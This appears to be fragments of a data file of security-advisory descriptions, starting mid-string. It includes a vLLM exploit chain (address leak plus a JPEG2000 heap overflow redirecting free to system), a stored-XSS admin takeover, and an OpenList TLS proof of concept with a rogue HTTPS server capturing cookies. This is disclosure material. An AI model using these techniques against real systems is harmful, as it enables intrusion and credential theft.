HTTP(S), vLLM downloads it as **raw bytes** and passes the bytes into the modality loader:\n\n```python\nif url_spec.scheme.startswith(\"http\"):\n    data = connection.get_bytes(url, timeout=fetch_timeout, allow_redirects=...)\n    return media_io.load_bytes(data)\n```\n\nSource: `src/vllm/multimodal/utils.py` (`MediaConnector.load_from_url`).\n\n---\n\n### 2) Decode: vLLM uses OpenCV (cv2) VideoCapture on an in-memory byte stream\n\nThe default video backend is OpenCV, and it constructs `cv2.VideoCapture` over a `BytesIO` buffer containing the downloaded bytes:\n\n```python\nbackend = cls().get_cv2_video_api()\ncap = cv2.VideoCapture(BytesIO(data), backend, [])\nif not cap.isOpened():\n    raise ValueError(\"Could not open video stream\")\n```\n\nSource: `src/vllm/multimodal/video.py` (`OpenCVVideoBackend.load_bytes`).\n\nThe backend is selected from OpenCV\u2019s stream-buffered backends registry:\n\n```python\nimport cv2.videoio_registry as vr\nfor backend in vr.getStreamBufferedBackends():\n    if vr.hasBackend(backend) and ...:\n        api_pref = backend\n        break\nreturn api_pref\n```\n\nSource: `src/vllm/multimodal/video.py` (`OpenCVVideoBackend.get_cv2_video_api`).\n\n**Implication**: vLLM is delegating container parsing + codec decode to OpenCV\u2019s Video I/O stack (which, in typical builds, is backed by FFmpeg for MOV/MP4 and codecs like JPEG2000).\n\n---\n\n### 3) The actual overflow: Y (full-res) written into U (quarter-res)\n\nWhen the decoder honors the remap and writes Y into the U-plane buffer, it writes **too many bytes**:\n\n- Y plane bytes: \\(W \\times H\\)\n- U plane bytes: \\((W/2) \\times (H/2)\\)\n- Overflow bytes: \\(W \\times H - (W/2 \\times H/2) = 0.75 \\times W \\times H\\)\n\nConcrete example tried (150\u00d764):\n\n- **Y**: \\(150 \\times 64 = 9600\\) bytes  \n- **U**: \\(75 \\times 32 = 2400\\) bytes  \n- **Overflow**: \\(9600 - 2400 = 7200\\) bytes past the end of the U allocation\n\nThis is a **heap buffer overflow** into whatever allocations follow the U-plane buffer in the decoder\u2019s heap layout (structures, metadata, other buffers, etc.). The exact victims depend on build + runtime allocator layout.\n\n---\n\n## The Exploit Chain \n\n### Vuln 1: PIL BytesIO Address Leak (ASLR Bypass)\n\nWhen you send an **invalid image** to vLLM's multimodal endpoint, PIL throws an error like:\n\n```\ncannot identify image file <_io.BytesIO object at 0x7a95e299e750>\n                                                   ^^^^^^^^^^^^^^^^\n                                                   LEAKED ADDRESS!\n```\n\nvLLM returns this error to the client, **leaking a heap address**. This address is ~10.33 GB before `libc` in memory. With this leak, we reduce ASLR from **4 billion guesses to ~8 guesses**.\n\n### Vuln 2: JPEG2000 cdef Heap Overflow (RCE)\n\nvLLM uses **OpenCV (cv2)** to decode videos. OpenCV bundles **FFmpeg 5.1.x** which has a heap overflow in the JPEG2000 decoder. The OpenCV is used for video decoding so if we build a video from JPEG2000 frames it will reach the vuln:\n\n```\nvLLM API Request to Completions/Invocation\n     \u2193\nOpenCV cv2.VideoCapture()\n     \u2193\nFFmpeg 5.1 (bundled in OpenCV)\n     \u2193\nJPEG2000 decoder (libopenjp2)\n     \u2193\nHEAP OVERFLOW via malicious \"cdef\" box\n     \u2193\nOverwrite function pointer \u2192 RCE!\n```\n\n**How the overflow works:**\n- JPEG2000 has a `cdef` box that remaps color channels\n- We remap Y (luma) into the U (chroma) buffer\n- Y plane = 9,600 bytes, U plane = 2,400 bytes\n- On small geometry like 150x64 pixel image we get **7,200 bytes overflow** past the U buffer. We can grow that exponentially by making bigger images. \n- This overwrites an `AVBuffer` structure containing a `free()` function pointer. This could be any function pointer or other targets. \n- We set `free = system()` and `opaque = \"command string\"`\n- When the buffer is freed \u2192 `system(\"our command\")` executes\n\n---\n\n## vLLM Attack Surface\n\n### Affected Endpoints\n\nBoth multimodal endpoints are vulnerable:\n\n```\nPOST /v1/chat/completions     (with video_url in content)\nPOST /v1/invocations          (with video_url in content)\n```\n\n### Request Flow\n\n```\n1. Attacker sends request with video_url pointing to malicious .mov file\n2. vLLM fetches the video from the URL\n3. vLLM passes video bytes to cv2.VideoCapture()\n4. OpenCV's bundled FFmpeg decodes JPEG2000 frames\n5. Malicious cdef box triggers heap overflow\n6. AVBuffer.free pointer overwritten with system()\n7. When buffer is released \u2192 system(\"attacker command\") executes\n```\n\n---\n\n## Versions Affected\n\n| Component | Version | Notes |\n|-----------|---------|-------|\n| vLLM | >= 0.8.3, < 0.14.1 | Default config vulnerable when serving a video model |\n| OpenCV (cv2) | 4.x with FFmpeg bundle | Bundled FFmpeg is vulnerable |\n| FFmpeg | 5.1.x (bundled) | JPEG2000 cdef overflow |\n| libopenjp2 | 2.x | Honors malicious cdef box |\n\n---\n\n## Fixes\n\n* https://github.com/vllm-project/vllm/pull/31987\n* https://github.com/vllm-project/vllm/pull/32319\n* https://github.com/vllm-project/vllm/pull/32668",

    "description": "### Summary\nA Stored Cross-Site Scripting (XSS) vulnerability was discovered in the Observations field. The flaw occurs in the History view, where historical data is rendered without proper HTML entity encoding. This allows an attacker to execute arbitrary JavaScript in the browser of  viewing the history by administrators.\n\n### Details\nWhen an administrator views the History tab of that specific note, the script executes in their browser session.\n\n### PoC\n\n1. Log in as a regular user.\n2. Open \"Sales\"=>\"Customers\"=> \"Delivery Notes\"\n<img width=\"818\" height=\"223\" alt=\"image\" src=\"https://github.com/user-attachments/assets/82518644-2676-42db-93b1-86133986276c\" />\n\n3.  Chose one of the customer or create the new one.\n\n4. Open \"Delivery notes\"\n<img width=\"2078\" height=\"713\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7e5027f-e574-4807-9e9c-bf8a51bc1fff\" />\n5.

In the Observations field, enter the malicious JavaScript and save it again.\n<img width=\"2097\" height=\"870\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f189c53b-8b73-44e8-bb18-bd46f37cef4f\" />\n<img width=\"1539\" height=\"885\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b2d20eb1-246e-4acc-b904-77bc85373873\" />\n7. Now we have record in \"History\" tab.\n<img width=\"2096\" height=\"768\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6b76d7d4-fc2c-4eb1-9137-4e4ba7287b9b\" />\n8. Logout and login as admin. Next go to the \"History\" tab with malicious code:\n<img width=\"1730\" height=\"702\" alt=\"image\" src=\"https://github.com/user-attachments/assets/54f4af37-72f3-47a0-9669-2b1f6293f2b4\" />\n<img width=\"1749\" height=\"670\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7689083-0128-473c-a4e2-1898e801df78\" />\n<img width=\"1479\" height=\"587\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4a6d6e4e-4645-4566-be92-9964c470456e\" />\n<img width=\"1541\" height=\"505\" alt=\"image\" src=\"https://github.com/user-attachments/assets/484d9e5f-596a-4508-a9cb-752e16e6564f\" />\n<img width=\"2095\" height=\"904\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5462f11c-b274-40e6-af00-d10e7fc1e855\" />\n\nResult: Upon opening the history record, the onerror event triggers, executing the JavaScript and displaying an alert box with the application's origin.\n\n### Impact\n\nChange admin password via XSS:\n<img width=\"2094\" height=\"1260\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7598f986-0618-46e1-9dc7-64655975b19e\" />\n<img width=\"1584\" height=\"1137\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e2302bc-01a3-4c47-ba9a-e69413e932b3\" />\n<img width=\"2084\" height=\"373\" alt=\"image\" src=\"https://github.com/user-attachments/assets/21523278-5bcc-4743-8557-4b6563a127d0\" />\n<img width=\"1665\" height=\"787\" alt=\"image\" src=\"https://github.com/user-attachments/assets/eca4d5b7-5dec-410f-9c59-99084821e350\" />\nAdmin password was changed\n<img width=\"1488\" height=\"598\" alt=\"image\" src=\"https://github.com/user-attachments/assets/53d3f4c1-accd-4136-8235-0fe5b287bbfe\" />\n\nThis vulnerability results in a Critical Full Account Takeover, allowing any user with note-editing permissions to seize control of the admin account. It successfully bypasses CSRF protections and exploits the lack of \"current password\" verification during credential changes. Once compromised, the attacker gains total access to the system's management, sensitive financial data, and user configurations.\n\n### Technical requirements & Complexity\nThe attack requires prior technical knowledge of the internal API structure (field names and required values), which can be obtained by a legitimate user through browser developer tools. While it requires the target's code (e.g., admin), this is a common default value in most installations.",

This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\n### Details\nCertificate verification is disabled by default for all storage driver communications.\n\nThe `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/OpenListTeam/OpenList/blob/5db2172ed681346b69ed468c73c1f01b6ed455ea/internal/conf/config.go#L185).\n\n~~~\nfunc DefaultConfig() *Config {\n    // ...\n    TlsInsecureSkipVerify: true,\n    // ...\n}\n~~~\n\nThis vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings.\n\n### PoC\nWe modified the /etc/hostsfile to simulate DNS hijacking and redirect [www.weiyun.com](http://www.weiyun.comto/) to a malicious TLS-enabled HTTP server.\n\nThe purpose of this PoC is to demonstrate that the Openlist server will indeed establish communication with a malicious server due to disabled certificate verification. This allows us to intercept and steal authentication cookies used for communicating with other storage providers.\n\n#### Setup a malicious https server:\n*ssl.conf*:\n~~~\nLoadModule ssl_module modules/mod_ssl.so\nLoadModule log_config_module modules/mod_log_config.so\n\nListen 443\n\nLogFormat \"%h %l %u %t \\\"%r\\\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i\" headers\nCustomLog \"/usr/local/apache2/logs/headers.log\" headers\n\n<VirtualHost _default_:443>\n    DocumentRoot \"/usr/local/apache2/htdocs\"\n    ServerName localhost\n\n    SSLEngine on\n    SSLCertificateFile \"/usr/local/apache2/conf/server.crt\"\n    SSLCertificateKeyFile \"/usr/local/apache2/conf/server.key\"\n\n    ErrorLog \"/usr/local/apache2/logs/ssl_error.log\"\n\n    <Directory \"/usr/local/apache2/htdocs\">\n        Options Indexes FollowSymLinks\n        AllowOverride None\n        Require all granted\n    </Directory>\n</VirtualHost>\n~~~\n\n*Dockerfile*:\n~~~\nFROM httpd:2.4\n\n# Copy SSL config\nCOPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf\n\n# Include SSL config in main httpd.conf\nRUN echo \"Include conf/extra/ssl.conf\" >> /usr/local/apache2/conf/httpd.conf\n\n# Copy certs\nCOPY certs/server.crt /usr/local/apache2/conf/server.crt\nCOPY certs/server.key /usr/local/apache2/conf/server.key\n~~~\n\n*build-ssh-httpd.sh*\n~~~bash\nmkdir certs\nopenssl req -x509 -nodes -days 365 \\\n  -newkey rsa:2048 \\\n  -keyout certs/server.key \\\n  -out certs/server.crt\ndocker build -t httpd-test-ssl .\n~~~\n\n*docker-compose.yaml*:\n~~~\nservices:\n  openlist:\n    restart: always\n    volumes:\n      - '/etc/openlist:/opt/openlist/data'\n    ports:\n      - '5244:5244'\n      - '5245:5245'\n    user: '0:0'\n    environment:\n      - UMASK=022\n      - TZ=Asia/Shanghai\n    container_name: openlist\n    image: 'openlistteam/openlist:latest'\n\n  evilhttpd:\n    image: 'httpd-test-ssl:latest'\n~~~\n\n#### Simulate DNS hijacking\nModify openlist container's /etc/hosts to redirect www.weiyun.com to malicious server:\n~~~\n<IP of HTTPS Server>      www.weiyun.com\n~~~\n\nYou can `ping evilhttpd` to obtain its IP.\n\n#### Trigger\nIn the front end, add a weiyun storage and inspect log on tls server:\n\n~~~\nroot@3c5bbda440c9:/usr/local/apache2# tail -n 1  /usr/local/apache2/logs/headers.log\n172.18.0.2 - - [18/Dec/2025:06:29:48 +0000] \"POST /webapp/json/weiyunQdiskClient/DiskUserInfoGet?cmd=2201&g_tk= HTTP/1.1\" 404 236 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Macintosh; Apple macOS 15_5) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Chrome/138.0.0.0 Referer:- Accept:- Cookie:test-secret-cookie=\n~~~\n\nNote that the cookie in the log.\n\n### Impact\nThis misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\nThis vulnerability affects all openlist deployment with default TLS configuration.\n\n### Note\nCredit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nCVE and credit are preferred.\n\nIf you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion.

    "description": "An issue was discovered in Wind River VxWorks 6.9 and 7. The function ``tarExtract`` implements TAR file extraction and thereby also processes files within an archive that have relative or absolute file paths. A developer using the \"tarExtract\" function may expect that the function will strip leading slashes from absolute paths or stop processing when encountering relative paths that are outside of the extraction path, unless otherwise forced. This could lead to unexpected and undocumented behavior, which in general could result in a directory traversal, and associated unexpected behavior.",

The communication with the XPC service of the privileged helper is only allowed if the client process is signed with the corresponding certificate and fulfills the following code signing requirement:\n\"anchor trusted and certificate leaf[subject.CN] = \\\"Developer ID Application: Native Instruments GmbH (83K5EG6Z9V)\\\"\"\n\nThe Native Access application was found to be signed with the `com.apple.security.cs.allow-dyld-environment-variables` and `com.apple.security.cs.disable-library-validation` entitlements leading to DYLIB injection and therefore command execution in the context of this application. A low privileged user can exploit the DYLIB injection to trigger functions of the privileged helper XPC service resulting in privilege escalation by first deleting the /etc/sudoers file and then copying a malicious version of that file to /etc/sudoers.",

Additionally, a signed certificate for the domain was publicly distributed with the Companion application. An attacker in the position to control DNS resolution of their victim could carry out a man-in-the-middle (MITM) attack between Confluence Server (or Confluence Data Center) and the atlassian-domain-for-localhost-connections-only.com domain intended to be used with the Companion application. This certificate has been revoked, however, usage of the atlassian-domain-for-localhost-connections-only.com domain name was still present in Confluence Server and Confluence Data Center. An attacker could perform the described attack by denying their victim access to certificate revocation information, and carry out a man-in-the-middle (MITM) attack to observe files being edited using the Companion application and/or modify them, and access some limited user information.",

    "description": "A vulnerability in huggingface/text-generation-inference version 3.3.6 allows unauthenticated remote attackers to exploit unbounded external image fetching during input validation in VLM mode. The issue arises when the router scans inputs for Markdown image links and performs a blocking HTTP GET request, reading the entire response body into memory and cloning it before decoding. This behavior can lead to resource exhaustion, including network bandwidth saturation, memory inflation, and CPU overutilization. The vulnerability is triggered even if the request is later rejected for exceeding token limits. The default deployment configuration, which lacks memory usage limits and authentication, exacerbates the impact, potentially crashing the host machine. The issue is resolved in version 3.3.7.",

    "description": "A vulnerability in the `lollms_generation_events.py` component of parisneo/lollms version 5.9.0 allows unauthenticated access to sensitive Socket.IO events. The `add_events` function registers event handlers such as `generate_text`, `cancel_generation`, `generate_msg`, and `generate_msg_from` without implementing authentication or authorization checks. This allows unauthenticated clients to execute resource-intensive or state-altering operations, leading to potential denial of service, state corruption, and race conditions. Additionally, the use of global flags (`lollmsElfServer.busy`, `lollmsElfServer.cancel_gen`) for state management in a multi-client environment introduces further vulnerabilities, enabling one client's actions to affect the server's state and other clients' operations. The lack of proper access control and reliance on insecure global state management significantly impacts the availability and integrity of the service.",
